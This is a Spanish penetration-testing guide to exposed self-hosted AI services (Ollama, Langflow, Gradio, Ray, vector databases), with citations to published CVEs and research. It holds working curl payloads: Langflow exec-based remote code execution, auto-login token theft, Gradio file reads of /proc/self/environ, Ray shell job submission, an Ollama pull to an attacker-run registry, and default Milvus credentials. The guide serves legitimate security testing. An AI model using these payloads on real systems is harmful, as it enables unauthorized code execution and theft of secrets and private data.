# Servicios de IA autoalojados expuestos

{{#include ../banners/hacktricks-training.md}}

Los equipos que desarrollan funciones de IA suelen ejecutar sus propios ejecutores de modelos, creadores de agentes, interfaces de demostración, clústeres de cómputo y bases de datos vectoriales. Muchas de estas herramientas se diseñaron para una laptop o una red de laboratorio cerrada, por lo que **no tienen autenticación de forma predeterminada** o incluyen un atajo de autenticación habilitado. Cuando un atacante puede acceder a uno de estos servicios, el impacto suele pertenecer a uno de estos grupos:

- Uso gratuito de GPU y modelos, y robo de modelos privados.
- Filtración de prompts, documentos y embeddings.
- Filtración de secretos del entorno del proceso (claves de proveedores de LLM, credenciales de la nube).
- Ejecución de código, porque algunas de estas API ejecutan código **como una función**.

Esta página describe cómo encontrar estos servicios y qué probar en cada tipo de API. Para proteger un servidor de inferencia autoalojado y el leak de llama.cpp `/slots`, consulta [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Para archivos de modelos maliciosos, consulta [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Envía estas solicitudes sin credenciales. Una respuesta JSON con los campos esperados identifica el producto y, a menudo, la versión, lo que indica cuáles de las comprobaciones siguientes corresponden. Los puertos son los valores predeterminados documentados o los puertos utilizados en los ejemplos oficiales de ejecución.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Producto | Puerto habitual | Solicitud sin autenticación | Qué lo identifica |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON de la versión, lista de modelos locales |
| Langflow | 7860 | `GET /api/v1/version` | JSON de la versión de Langflow |
| Gradio | 7860 | `GET /config` | Configuración de la aplicación con la versión de Gradio y los ID de los componentes |
| Panel de Ray | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, lista de trabajos enviados |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Valor de heartbeat, versión de Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Versión de Qdrant, lista de colecciones |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Versión de Weaviate, clases |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Lista de colecciones o error de autenticación |

Estos servicios también suelen publicarse detrás de un proxy inverso con un prefijo de ruta (por ejemplo, `/ollama/` o `/ray/`), así que repite las solicitudes bajo cualquier prefijo que encuentres en los bundles de JavaScript o en la documentación de la API.

## API de inferencia y administración de modelos sin autenticación

Los ejecutores de modelos suelen exponer una única API REST que combina rutas de inferencia con rutas administrativas. Ollama es un buen ejemplo. No tiene autenticación integrada y, de forma predeterminada, se enlaza a `127.0.0.1:11434`, mientras que `OLLAMA_HOST` cambia la dirección de enlace.<sup>[[1]](#references)[[15]](#references)</sup> La imagen oficial de Docker establece `OLLAMA_HOST=0.0.0.0:11434` dentro del contenedor, declara `EXPOSE 11434` y no incluye una instrucción `USER`, por lo que el servidor se ejecuta como root dentro del contenedor.<sup>[[16]](#references)</sup> `EXPOSE` no publica el puerto en el host, así que la accesibilidad desde el host depende del despliegue. Los comandos documentados de `docker run` usan `-p 11434:11434`, y Docker publica esa asignación en todas las interfaces del host, salvo que se especifique una IP del host.<sup>[[17]](#references)[[18]](#references)</sup>

Qué obtiene un atacante con cada grupo de rutas:<sup>[[2]](#references)</sup>

| Rutas | Impacto si no requieren autenticación |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Lista de modelos locales y cargados, incluidos los modelos personalizados privados |
| `POST /api/show` | Detalles del modelo, incluidos el Modelfile, la plantilla y el **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inferencia gratuita en el hardware de la víctima |
| `POST /api/pull`, `/api/push` | Hacer que el servidor descargue desde un registro elegido por el atacante o suba un modelo a él |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Crear, sobrescribir o eliminar modelos |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Una lista de modelos devuelta sin credenciales ya demuestra la exposición. Los modelos personalizados suelen incluir un system prompt interno en `/api/show`. Un pull hacia tu host demuestra que el servidor obtiene manifests de registries elegidos por el atacante. Un `/api/push` hacia tu registry convierte la exposición en robo de modelos. No llames a rutas de creación o eliminación en objetivos reales.

Los pulls de registries también son una superficie de ataque del parser, porque el servidor almacena blobs usando valores del manifest remoto. En Probllama (CVE-2024-37032, corregido en Ollama 0.1.34), el `digest` del manifest se usaba como nombre de archivo sin validación. Por lo tanto, un registry malicioso podía escribir archivos fuera del directorio de blobs usando secuencias `../`. Al enviar un manifest preparado cuyo digest apuntaba a un archivo local, se filtraba ese archivo al registry del atacante. Wiz logró RCE en Docker, donde el servidor se ejecuta como root, escribiendo una biblioteca compartida y añadiéndola a `/etc/ld.so.preload`; luego llamó a `/api/chat` para que un nuevo proceso la cargara.<sup>[[15]](#references)</sup> Cuando un runner puede obtener datos de registries arbitrarios, comprueba cómo convierte los campos del manifest en rutas.

## APIs que ejecutan código por diseño

### APIs de envío de trabajos

Los frameworks de computación distribuida tratan la ejecución de código como su función principal. La API de Ray Jobs, en el puerto del dashboard (8265), acepta un comando shell `entrypoint` y lo ejecuta en el clúster.<sup>[[19]](#references)</sup> La investigación ShadowRay de Oligo informa que la API Jobs no tiene autorización y que el dashboard está vinculado a `0.0.0.0`. El CVE-2023-48022 correspondiente es objeto de controversia porque Ray está pensado para ejecutarse solo dentro de una red controlada.<sup>[[20]](#references)</sup> Ray añadió autenticación opcional con token (`RAY_AUTH_MODE=token`) en la versión 2.52.0. Ray 2.59 la habilita de forma predeterminada para clústeres locales iniciados con `ray.init()`; `ray start --head` aún puede iniciarse sin autenticación si no hay un token disponible. Ray documenta una implementación más amplia de la autenticación predeterminada para la versión 2.61, así que comprueba la versión desplegada y el modo de inicio en lugar de asumir que el dashboard está abierto.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Los dashboards de este tipo también tienen rutas auxiliares que vale la pena probar en versiones antiguas. Antes de Ray 2.8.1, `/log_proxy?url=` obtenía cualquier URL HTTP(S) (SSRF a los metadatos de cloud) y `/api/v0/logs/file` aceptaba una ruta `filename` arbitraria, ambos sin autenticación.<sup>[[8]](#references)</sup>

### Endpoints de "validación" de código que ejecutan definiciones de funciones

Los constructores de agentes que aceptan componentes Python personalizados a veces "validan" el código analizándolo con `ast` y ejecutando solo las definiciones de funciones con `exec()`. Esto no es seguro. Python evalúa **los decoradores y los valores predeterminados de los argumentos al definir la función**, así que el código ubicado allí se ejecuta incluso si nunca se ejecuta el cuerpo de la función. `POST /api/v1/validate/code` de Langflow funcionaba de esta manera y no requería autenticación antes de la versión 1.3.0 (CVE-2025-3248). Si se genera una excepción que contiene la salida del comando, el endpoint devuelve esa salida en la respuesta:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Prueba cualquier endpoint que compile, haga lint o "compruebe" código del usuario en busca de este patrón, y prefiere una callback DNS como prueba.

### Rutas de inicio de sesión automático y token de superusuario predeterminado

Las herramientas para un solo usuario suelen incluir un atajo que inicia sesión como administrador para cada visitante. En Langflow, cuando `AUTO_LOGIN` está habilitado, `GET /api/v1/auto_login` devuelve tokens del superusuario predeterminado a cualquier persona que lo solicite. Cuando está deshabilitado, la ruta responde `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 a 1.10.0 lo tenía habilitado de forma predeterminada (CVE-2026-9103). Al encadenarlo con la ruta autenticada de validación de código mencionada anteriormente, se restaura la RCE no autenticada (CVE-2026-9198, reportada por Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Los paquetes de las versiones oficiales actuales y las imágenes de Docker deshabilitan el inicio de sesión automático y requieren una contraseña de superusuario, pero las ramas de desarrollo lo mantienen habilitado.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Incluso sin ejecución de código, un token de superusuario da acceso a todos los flujos y a las credenciales almacenadas del proveedor. Para una comprobación de requisitos previos relacionada en pruebas automatizadas, consulta [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Rutas de servicio de archivos y RPC en UIs de demostración de ML

Los frameworks de demostración de ML sirven archivos cargados y generados mediante una ruta genérica y permiten que el frontend invoque helpers de componentes del lado del servidor. Gradio expone `/config`, `/upload` y `/file=<path>` para esto.<sup>[[5]](#references)</sup> Vale la pena probar dos patrones en cualquier framework similar:

- **Traversal desde un subdirectorio de carga:** si la ruta de archivos solo comprueba que la ruta comienza dentro de la carpeta temporal, carga un archivo para crear un subdirectorio y luego sal de él con `../` o `%2e%2e%2f`. Gradio de 4.0 a 4.10 (CVE-2023-51449) era vulnerable de esta forma.<sup>[[26]](#references)[[27]](#references)</sup> Envía la solicitud con `curl --path-as-is` para que el cliente no normalice la ruta.
- **Despacho de métodos arbitrarios:** un endpoint que llama a `getattr(component, fn_name)` con datos del usuario permite que el atacante invoque helpers internos. Antes de 4.13.0, `/component_server` de Gradio hacía esto. De 4.3 a 4.12, `move_resource_to_block_cache` copiaba cualquier archivo local a la caché, desde donde `/file=` podía descargarlo. De 3.47 a 3.50.2, otros helpers permitían leer archivos y realizar un SSRF de lectura completa.<sup>[[26]](#references)[[28]](#references)</sup> Un servidor corregido responde `Function not found.` para los helpers que no están marcados como funciones del servidor.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

En Hugging Face Spaces, los secretos de Space son variables de entorno, por lo que `/proc/self/environ` es el archivo más valioso. Horizon3 lo leyó con un encabezado HTTP `Range`.<sup>[[26]](#references)</sup>

## Bases de datos vectoriales usadas por RAG

RAG almacena fragmentos de los documentos originales, sus embeddings y metadatos en una base de datos vectorial, y el asistente coloca los resultados más relevantes en su prompt. Por tanto, el acceso de lectura filtra el **texto sin formato de documentos privados**. El acceso de escritura permite a un atacante insertar fragmentos que luego se recuperan en los prompts de otros usuarios, lo que constituye una inyección indirecta persistente de prompts (consulta [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

En las bases de datos vectoriales autohospedadas, comprueba si se ha configurado la autenticación o si está habilitado el acceso anónimo:

- **Qdrant**: las instancias implementadas por cuenta propia escuchan en todas las interfaces sin autenticación. Si se configura, la clave se incluye en el encabezado `api-key` o como `Authorization: Bearer`. Puede haber claves de solo lectura y claves por colección.<sup>[[11]](#references)</sup>
- **Chroma**: la autenticación está deshabilitada de forma predeterminada. La autenticación por token usa `Authorization` o `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: cuando se habilita el acceso anónimo, las solicitudes sin credenciales se autentican como `user: anonymous` y obtienen los permisos que tenga ese usuario.<sup>[[30]](#references)</sup>
- **Milvus**: la autenticación está desactivada a menos que `common.security.authorizationEnabled` sea `true`. Cuando está activada, el usuario predeterminado `root` tiene la contraseña `Milvus` y el formato del token es `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Una respuesta que contenga datos privados sin credenciales indica una exposición. Si la autenticación está habilitada, evalúa por separado cualquier cuenta predeterminada cuya configuración no se haya cambiado:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Comprueba si los payloads contienen texto de documentos, identificadores de usuario o nombres de tenants. Para demostrar el acceso de escritura sin contaminar los datos de producción, crea y elimina inmediatamente una colección vacía con un nombre claro, y solo cuando el alcance lo permita.

La autenticación en estos servidores también puede llegar demasiado tarde. En el servidor Python FastAPI de Chroma (de la versión 1.0.0 a, como mínimo, la 1.5.8, CVE-2026-45829), la ruta de creación de colecciones construía la función de embedding proporcionada por el cliente antes de la comprobación de autenticación. Una configuración que hacía referencia a un modelo de Hugging Face controlado por un atacante con `trust_remote_code: true` ejecutaba el código del atacante aunque la solicitud fuera rechazada. El frontend de Rust no se vio afectado.<sup>[[32]](#references)</sup> Cuando una solicitud incluya configuración de modelo o plugin, pruébala sin credenciales y observa si se realiza una solicitud saliente a tu repositorio de modelos.

## References

- [1] [Preguntas frecuentes de Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Documentación de la API de Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README de Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Código fuente de Langflow - Endpoints de API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Código fuente de Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Código fuente de Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Código fuente de Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, versiones 2.6.3 y 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Código fuente de Chroma - Valores predeterminados del cliente Python](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Código fuente de Chroma - Rutas del servidor FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Seguridad](https://qdrant.tech/documentation/security/)
- [12] [Especificación OpenAPI de Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Especificación OpenAPI de Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Conectarse al servidor de Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: vulnerabilidad de ejecución remota de código en Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile de Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Documentación de Docker de Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Publicar y exponer puertos](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [API REST de Ray Jobs](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: primera campaña de ataque conocida dirigida a cargas de trabajo de IA y explotada en entornos reales](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Autenticación por token de Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Inseguro a cualquier velocidad: abuso de Python Exec para lograr RCE no autenticada en Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Código fuente de Langflow - Enrutador de inicio de sesión](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Explotación de vulnerabilidades de lectura de archivos en Gradio para robar secretos de Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Aviso de Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit de corrección de Gradio para `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Autenticación nativa de Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Autenticación](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Autenticar el acceso de usuarios](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast servido antes de la autenticación](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Boletín de seguridad de IBM - Ejecución remota de código no autenticada mediante bypass de inicio de sesión automático y validación de código (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
